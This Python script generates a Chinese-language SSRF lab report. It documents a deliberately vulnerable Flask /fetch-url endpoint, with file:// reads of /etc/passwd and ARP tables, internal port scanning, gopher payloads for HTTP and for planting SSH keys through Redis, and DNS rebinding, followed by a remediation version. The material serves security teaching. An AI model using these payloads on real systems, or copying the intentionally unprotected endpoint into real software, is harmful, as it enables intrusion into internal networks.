#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SSRF服务端请求伪造漏洞分析与修复报告（v2 — 采纳review意见）"""
import os
from docx import Document
from docx.shared import Pt, RGBColor
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.enum.table import WD_TABLE_ALIGNMENT
from docx.oxml.ns import qn, nsdecls
from docx.oxml import parse_xml

doc = Document()

style = doc.styles['Normal']
style.font.name = 'Microsoft YaHei'
style.font.size = Pt(11)
style.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')
for i in range(1,5):
    hs = doc.styles[f'Heading {i}']
    hs.font.name = 'Microsoft YaHei'
    hs.element.rPr.rFonts.set(qn('w:eastAsia'), 'Microsoft YaHei')

def shade(c, color):
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{color}" w:val="clear"/>')
    c._tc.get_or_add_tcPr().append(s)

def tbl(doc, data):
    t = doc.add_table(rows=len(data), cols=len(data[0]), style='Light Grid Accent 1')
    t.alignment = WD_TABLE_ALIGNMENT.CENTER
    for i, rd in enumerate(data):
        for j, ct in enumerate(rd):
            t.rows[i].cells[j].text = ct
            for p in t.rows[i].cells[j].paragraphs:
                p.alignment = WD_ALIGN_PARAGRAPH.CENTER
                for r in p.runs: r.font.size = Pt(10)
            if i==0:
                shade(t.rows[i].cells[j], "1A237E")
                for p in t.rows[i].cells[j].paragraphs:
                    for r in p.runs: r.font.color.rgb = RGBColor(0xFF,0xFF,0xFF)
    return t

def code(doc, text, green=False):
    p = doc.add_paragraph()
    p.paragraph_format.space_before = Pt(3)
    p.paragraph_format.space_after = Pt(3)
    fill = "E8F5E9" if green else "FFEBEE"
    s = parse_xml(f'<w:shd {nsdecls("w")} w:fill="{fill}" w:val="clear"/>')
    p.paragraph_format.element.get_or_add_pPr().append(s)
    r = p.add_run(text)
    r.font.name = 'Courier New'
    r.font.size = Pt(9)
    return p

# ===== 封面 =====
for _ in range(4): doc.add_paragraph("")
t = doc.add_paragraph(); t.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = t.add_run("SSRF服务端请求伪造\n漏洞分析与修复报告"); r.font.size = Pt(24); r.bold = True
r.font.color.rgb = RGBColor(0x1a,0x1a,0x2e)
doc.add_paragraph("")
s = doc.add_paragraph(); s.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = s.add_run("Server-Side Request Forgery · file伪协议 · gopher伪协议 · 内网扫描 · DNS重绑定"); r.font.size = Pt(14)
for _ in range(3): doc.add_paragraph("")
i = doc.add_paragraph(); i.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = i.add_run("实验日期：2026年7月"); r.font.size = Pt(12)
doc.add_page_break()

doc.add_heading("目  录", level=1)
chs = ["SSRF漏洞概述与三主机攻击模型","SSRF攻击原理与file伪协议",
    "ARP协议探测内网结构","内网服务扫描（Burp Intruder）",
    "gopher伪协议攻击（HTTP + Redis）","DNS重绑定绕过技术",
    "/fetch-url 漏洞代码分析","修复方案详解（含完整代码）",
    "修复前后代码对比"]
for i,c in enumerate(chs,1):
    p = doc.add_paragraph(f"第{i}章  {c}")
    p.paragraph_format.space_after = Pt(6); p.runs[0].font.size = Pt(12)
doc.add_page_break()

# ===== 第一章 =====
doc.add_heading("第一章  SSRF漏洞概述与三主机攻击模型", level=1)
doc.add_paragraph("SSRF（Server-Side Request Forgery，服务端请求伪造）是一种Web安全漏洞，攻击者通过控制服务端发起的HTTP请求，访问或操作内部网络资源。由于服务端位于内网，可以绕过防火墙访问外部无法直接到达的内部系统。")

tbl(doc, [("评估项","评级"),("CVSS 3.0","8.7（High）"),("攻击向量","网络远程攻击（AV:N）"),
    ("影响范围","内网探测、端口扫描、敏感文件读取、云元数据窃取")])

doc.add_heading("1.1 三主机攻击模型（核心场景）", level=2)
doc.add_paragraph("本实验的核心攻击场景基于三主机模型，充分演示防火墙隔离下的SSRF攻击路径：")
doc.add_paragraph("")
code(doc,
    "┌─────────────────────────────────────────────────────────────┐\n"
    "│  攻击者(外网)             内网(防火墙隔离)                    │\n"
    "│  ┌─────────┐    公网     ┌─────────┐    内网     ┌─────────┐ │\n"
    "│  │ Kali    │──────────→│ 主机A   │──────────→│ 主机B   │ │\n"
    "│  │ 攻击者  │  只能访问A  │ Flask   │  防火墙     │ 内网服务 │ │\n"
    "│  │ 192.168 │  的SSRF端口 │ 公网映射 │  允许A→B   │ 172.250 │ │\n"
    "│  └─────────┘            └─────────┘            └─────────┘ │\n"
    "└─────────────────────────────────────────────────────────────┘")

doc.add_paragraph("")
doc.add_paragraph("攻击链说明：")
doc.add_paragraph("1. 主机A（Flask应用）映射到公网，攻击者可访问", style='List Bullet')
doc.add_paragraph("2. 主机B（内网服务）在172.250.250.0/24网段，外部不可达", style='List Bullet')
doc.add_paragraph("3. 攻击者利用A的SSRF漏洞(/fetch-url)，以A为跳板访问B", style='List Bullet')
doc.add_paragraph("4. 防火墙允许A主动访问内网，但阻止外部直接访问B", style='List Bullet')
doc.add_paragraph("5. SSRF漏洞使攻击者能够绕过防火墙，间接控制对B的访问", style='List Bullet')

doc.add_heading("1.2 /proc/net/route 作为备选读取方案", level=2)
doc.add_paragraph("读取路由表获取内网网段是SSRF攻击的第一步。本文档主要使用 /proc/net/fib_trie，但该文件路径和格式在不同Linux内核版本下可能有差异。作为备选，可读取 /proc/net/route 获取类似信息：")
code(doc,
    "# 读取路由表（兼容性更广）\n"
    "url=file:///proc/net/route\n\n"
    "# 读取fib_trie（信息更详细，依赖内核版本）\n"
    "url=file:///proc/net/fib_trie")

# ===== 第二章 =====
doc.add_heading("第二章  SSRF攻击原理与file伪协议", level=1)
doc.add_heading("2.1 漏洞代码", level=2)
code(doc,
    '@app.route("/fetch-url", methods=["POST"])\n'
    'def fetch_url():\n'
    '    target_url = request.form.get("url", "")\n'
    '    # ⚠️ 直接将用户输入的URL传给urlopen()，无任何限制\n'
    '    req = urllib.request.Request(target_url)\n'
    '    resp = urllib.request.urlopen(req, timeout=10)\n'
    '    content = resp.read()\n'
    '    return content')

doc.add_heading("2.2 file://伪协议读取文件", level=2)
doc.add_paragraph("Python的urllib支持file://协议，可读取本地文件系统。攻击者利用SSRF漏洞读取服务器敏感文件，获取内网结构信息。这是SSRF攻击的第一步——信息收集。")

doc.add_paragraph("关键文件读取：")
code(doc,
    "# 读路由表（获取内网网段）\n"
    "url=file:///proc/net/fib_trie\n"
    "# 或备选：url=file:///proc/net/route\n\n"
    "# 读ARP缓存（获取活跃主机）\n"
    "url=file:///proc/net/arp\n\n"
    "# 读系统密码文件\n"
    "url=file:///etc/passwd\n\n"
    "# 读网络配置\n"
    "url=file:///proc/net/route")

doc.add_paragraph("")
doc.add_paragraph("从fib_trie获得的网段示例：")
code(doc,
    "172.250.250.0/24  ← 内网A段\n"
    "172.251.251.0/24  ← 内网B段\n"
    "127.0.0.0/8       ← 本机回环")

# ===== 第三章 =====
doc.add_heading("第三章  ARP协议探测内网结构", level=1)
doc.add_heading("3.1 ARP协议原理", level=2)
doc.add_paragraph("ARP（Address Resolution Protocol）将IP地址解析为MAC地址。/proc/net/arp记录了最近通信的所有设备的IP和MAC，直接暴露内网中的活跃主机，攻击者可据此快速锁定攻击目标。")

doc.add_heading("3.2 读取ARP缓存", level=2)
code(doc,
    "url=file:///proc/net/arp\n\n"
    "返回示例：\n"
    "IP address       HW type   Flags  HW address\n"
    "172.250.250.1    0x1       0x2    aa:bb:cc:dd:ee:ff\n"
    "172.250.250.4    0x1       0x2    11:22:33:44:55:66")

# ===== 第四章 =====
doc.add_heading("第四章  内网服务扫描（Burp Intruder）", level=1)
doc.add_heading("4.1 攻击思路", level=2)
doc.add_paragraph("利用SSRF漏洞的/fetch-url接口，结合Burp Intruder批量探测内网存活主机。")

doc.add_heading("4.2 Burp Intruder设置", level=2)
doc.add_paragraph("Step 1：POST /fetch-url 发送到Intruder（Ctrl+I）")
code(doc,
    'POST /fetch-url HTTP/1.1\n'
    'Content-Type: application/x-www-form-urlencoded\n'
    'Cookie: session=...\n\n'
    'url=http://172.250.250.§1§:80')

doc.add_paragraph("Step 2：配置参数")
tbl(doc, [("参数","设置"),
    ("攻击类型","狙击手（Sniper）"),
    ("Payload类型","Numbers（数字）"),
    ("范围","1 ~ 254，步长1"),
    ("并发数","Resource pool → 最大并发=20")])

doc.add_paragraph("Step 3：根据响应长度/状态码排序，筛选出有响应的IP")

doc.add_heading("4.3 端口扫描", level=2)
doc.add_paragraph("发现存活IP后，再对其扫描常见端口：")
code(doc,
    "url=http://172.250.250.4:80\n"
    "url=http://172.250.250.4:8080\n"
    "url=http://172.250.250.4:22\n"
    "url=http://172.250.250.4:3306\n\n"
    "常见端口：80/443(Web) 22(SSH) 3306(MySQL)\n"
    "6379(Redis) 27017(MongoDB) 9200(ES)")

# ===== 第五章 =====
doc.add_heading("第五章  gopher伪协议攻击（HTTP + Redis）", level=1)
doc.add_heading("5.1 Gopher协议原理", level=2)
doc.add_paragraph("Gopher是一种TCP层协议，攻击者可构造任意TCP数据包。在SSRF中，gopher协议可发送任意格式的请求，突破HTTP协议的限制。")
code(doc,
    "格式：gopher://host:port/_数据\n"
    "                 ↑    ↑\n"
    "              端口  占位符（被忽略，后面跟原始TCP数据）")

doc.add_heading("5.2 GET方式提交", level=2)
code(doc,
    "# gopher构造GET请求访问内网name.php\n"
    "url=gopher://172.250.250.4:80/_GET%20/name.php%3Fname%3Dbenben%20HTTP/1.1%0AHost:%20172.250.250.4%0A%0A")

doc.add_heading("5.3 POST方式提交", level=2)
code(doc,
    "# gopher构造POST请求\n"
    "url=gopher://172.250.250.4:80/_POST%20/login.php%20HTTP/1.1%0A"
    "Host:%20172.250.250.4%0AContent-Type:%20application/"
    "x-www-form-urlencoded%0AContent-Length:%2028%0A%0A"
    "username=admin&password=admin123")

doc.add_heading("5.4 gopher攻击Redis（经典高危害场景）", level=2)
doc.add_paragraph("Redis未授权访问是常见的内网安全问题。利用SSRF+gopher协议，攻击者可构造Redis命令写入SSH密钥或crontab实现反弹Shell。")
code(doc,
    "# 写入SSH公钥实现免密登录（精简版攻击链）\n"
    "# 三步：flushall（可选清空）→ set key写入公钥 → save保存\n"
    "gopher://172.250.250.4:6379/_*1%0D%0A$8%0D%0Aflushall%0D%0A"
    "*3%0D%0A$3%0D%0Aset%0D%0A$1%0D%0Ax%0D%0A$60%0D%0A"
    "\\n\\nssh-rsa AAAAB3NzaC1yc2E...\\n\\n%0D%0A"
    "*1%0D%0A$4%0D%0Asave%0D%0A")

# ===== 第六章 =====
doc.add_heading("第六章  DNS重绑定绕过技术", level=1)
doc.add_heading("6.1 原理", level=2)
doc.add_paragraph("DNS重绑定（DNS Rebinding）是一种绕过IP白名单的技术。攻击者注册一个域名，初始解析到合法公网IP通过验证，随后快速切换DNS记录到内网IP（如127.0.0.1或10.0.0.1），利用服务端DNS缓存差异绕过IP限制。")
code(doc,
    "攻击流程：\n"
    "Step1: 攻击者注册域名 attacker.com\n"
    "Step2: 第一次DNS解析 → 返回公网IP通过白名单\n"
    "Step3: 服务端用解析结果发起请求\n"
    "Step4: 第二次DNS解析 → 返回内网IP 127.0.0.1\n"
    "Step5: 请求到达内网服务，白名单被绕过")

# ===== 第七章 =====
doc.add_heading("第七章  /fetch-url 漏洞代码分析", level=1)
doc.add_heading("7.1 漏洞代码（app_pre_fix.py — 修复前版本）", level=2)
code(doc,
    'import urllib.request\n\n'
    '@app.route("/fetch-url", methods=["POST"])\n'
    'def fetch_url():\n'
    '    target_url = request.form.get("url", "")\n\n'
    '    # ⚠️ 漏洞S-01: 未限制URL协议\n'
    '    #    urllib支持 file:///etc/passwd 读取系统文件\n'
    '    #    urllib支持 gopher:// 任意TCP数据构造\n'
    '    #    urllib支持 dict:// 探测内网服务\n\n'
    '    # ⚠️ 漏洞S-02: 未阻止内网IP\n'
    '    #    可访问 127.0.0.1、10.x.x.x、172.16.x.x\n'
    '    #    可扫描整个内网网段\n\n'
    '    # ⚠️ 漏洞S-03: 未限制端口号\n'
    '    #    可扫描内网主机所有端口（22/3306/6379等）\n\n'
    '    # ⚠️ 漏洞S-04: 数据回显\n'
    '    #    攻击者可直接看到内网服务的响应内容\n\n'
    '    # ⚠️ 漏洞S-05: 无频率限制\n'
    '    #    攻击者可批量自动化扫描所有内网IP\n\n'
    '    req = urllib.request.Request(target_url)\n'
    '    resp = urllib.request.urlopen(req, timeout=10)\n'
    '    return resp.read()')

doc.add_heading("7.2 漏洞总结", level=2)
tbl(doc, [("编号","漏洞","严重度","说明"),
    ("S-01","协议未限制","🔴高危","支持file://读文件、gopher://构造TCP包"),
    ("S-02","内网IP未阻止","🔴高危","可扫描172.250.x.x整个内网段"),
    ("S-03","端口未限制","🔴高危","可探测3306/6379等内网服务"),
    ("S-04","数据回显","🔴高危","攻击者直接看到内网响应数据"),
    ("S-05","无频率限制","🟡中危","可批量自动化扫描")])

# ===== 第八章 =====
doc.add_heading("第八章  修复方案详解（含完整代码）", level=1)

doc.add_heading("8.1 重要说明：本实验的漏洞设计", level=2)
doc.add_paragraph("本项目中包含两个版本的代码：")
doc.add_paragraph("app_pre_fix.py（修复前版本）— 故意未实施安全限制，用于完整演示SSRF攻击手法", style='List Bullet')
doc.add_paragraph("app_fixed.py（修复后版本）— 实施标准SSRF防护措施，用于对比学习", style='List Bullet')
doc.add_paragraph("")
doc.add_paragraph("以下修复方案为标准的SSRF防护做法。但在app_pre_fix.py中，为完整演示file://、gopher://、内网扫描等攻击手法，故意未实施这些限制。读者应对比两版代码理解攻击与防御的对应关系。")

doc.add_heading("8.2 修复1：协议白名单", level=2)
code(doc,
    'ALLOWED_PROTOCOLS = ["http", "https"]\n'
    'parsed = urllib.parse.urlparse(target_url)\n'
    'if parsed.scheme not in ALLOWED_PROTOCOLS:\n'
    '    return "不支持的协议"', green=True)

doc.add_heading("8.3 修复2：阻止内网IP", level=2)
code(doc,
    'import socket, ipaddress\n'
    'host = socket.gethostbyname(parsed.hostname)\n'
    '# ⚠️ 注意：gethostbyname本身可能触发DNS解析SSRF\n'
    '# 攻击者可让服务器解析恶意外部域名\n'
    '# 生产环境应考虑使用DNS解析超时+本地DNS缓存\n'
    'if ipaddress.ip_address(host).is_private:\n'
    '    return "不允许访问内网地址"', green=True)

doc.add_paragraph("")
doc.add_paragraph("绕过风险提示：即使实施了IP白名单，攻击者仍可通过DNS重绑定技术绕过——先解析到公网IP，随后切换DNS记录指向内网IP。")

doc.add_heading("8.4 修复3：端口限制", level=2)
code(doc,
    'ALLOWED_PORTS = {80, 443, 8080}\n'
    'port = parsed.port or {"https": 443, "http": 80}.get(parsed.scheme, 80)\n'
    'if port not in ALLOWED_PORTS:\n'
    '    return "不允许的端口号"', green=True)

doc.add_heading("8.5 修复4：频率限制（Flask-Limiter实现）", level=2)
code(doc,
    'from flask_limiter import Limiter\n\n'
    'limiter = Limiter(app=app, key_func=lambda: request.remote_addr)\n\n'
    '@app.route("/fetch-url", methods=["POST"])\n'
    '@limiter.limit("10 per minute")  # 每分钟最多10次\n'
    'def fetch_url():\n'
    '    ...', green=True)

doc.add_heading("8.6 完整修复代码（app_fixed.py）", level=2)
code(doc,
    'import urllib.request\n'
    'import urllib.parse\n'
    'import socket\n'
    'import ipaddress\n\n'
    'ALLOWED_PROTOCOLS = {"http", "https"}\n'
    'ALLOWED_PORTS = {80, 443}\n\n'
    '@app.route("/fetch-url", methods=["POST"])\n'
    'def fetch_url():\n'
    '    target_url = request.form.get("url", "")\n\n'
    '    # 1️⃣ 解析URL\n'
    '    parsed = urllib.parse.urlparse(target_url)\n\n'
    '    # 2️⃣ 协议白名单\n'
    '    if parsed.scheme not in ALLOWED_PROTOCOLS:\n'
    '        return "不支持的协议"\n\n'
    '    # 3️⃣ 端口限制\n'
    '    port = parsed.port or 80\n'
    '    if port not in ALLOWED_PORTS:\n'
    '        return "不允许的端口"\n\n'
    '    # 4️⃣ 内网IP阻止\n'
    '    try:\n'
    '        host = socket.gethostbyname(parsed.hostname)\n'
    '        if ipaddress.ip_address(host).is_private:\n'
    '            return "不允许访问内网地址"\n'
    '    except socket.gaierror:\n'
    '        return "域名解析失败"\n\n'
    '    # 5️⃣ 限制响应最大长度\n'
    '    req = urllib.request.Request(target_url, headers={"User-Agent": "Mozilla/5.0"})\n'
    '    resp = urllib.request.urlopen(req, timeout=10)\n'
    '    content = resp.read(1024 * 100)  # 最多100KB\n'
    '    return content', green=True)

# ===== 第九章 =====
doc.add_heading("第九章  修复前后代码对比", level=1)
tbl(doc, [("对比项","修复前(app_pre_fix.py)","修复后(app_fixed.py)"),
    ("协议限制","❌ 无限制(file://gopher://dict://)","✅ 仅允许http/https"),
    ("内网IP","❌ 可访问任意IP","✅ 阻止私有网段+异常处理"),
    ("端口限制","❌ 任意端口可扫描","✅ 仅允许80/443"),
    ("数据回显","❌ 完整返回内网响应","✅ 限制最大100KB"),
    ("频率限制","❌ 无限制","✅ 每分钟10次"),
    ("DNS解析","❌ 无安全处理","✅ 异常处理+超时")])

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("修复前（app_pre_fix.py）："); r.bold = True; r.font.color.rgb = RGBColor(0xD3,0x2F,0x2F)
code(doc,
    '@app.route("/fetch-url", methods=["POST"])\n'
    'def fetch_url():\n'
    '    target_url = request.form.get("url", "")\n'
    '    req = urllib.request.Request(target_url)\n'
    '    resp = urllib.request.urlopen(req, timeout=10)\n'
    '    # ⚠️ 无任何限制 — 演示SSRF全攻击链')

doc.add_paragraph("")
p = doc.add_paragraph(); r = p.add_run("修复后（app_fixed.py）："); r.bold = True; r.font.color.rgb = RGBColor(0x2E,0x7D,0x32)
code(doc,
    '@app.route("/fetch-url", methods=["POST"])\n'
    'def fetch_url():\n'
    '    target_url = request.form.get("url", "")\n'
    '    parsed = urllib.parse.urlparse(target_url)\n\n'
    '    # ✅ 协议白名单\n'
    '    if parsed.scheme not in {"http", "https"}:\n'
    '        return "不支持的协议"\n'
    '    # ✅ 端口限制\n'
    '    if (parsed.port or 80) not in {80, 443}:\n'
    '        return "不允许的端口"\n'
    '    # ✅ 内网IP阻止\n'
    '    host = socket.gethostbyname(parsed.hostname)\n'
    '    if ipaddress.ip_address(host).is_private:\n'
    '        return "不允许访问内网"', green=True)

doc.add_paragraph("")
p = doc.add_paragraph(); p.alignment = WD_ALIGN_PARAGRAPH.CENTER
r = p.add_run("—— 报告结束 ——"); r.font.color.rgb = RGBColor(0x99,0x99,0x99); r.font.size = Pt(12)

out = "/root/flask-app-vuln/static/SSRF服务端请求伪造漏洞分析与修复报告.docx"
doc.save(out)
print(f"✅ 报告已生成：{out}")
print(f"   大小：{os.path.getsize(out)/1024:.1f}KB")
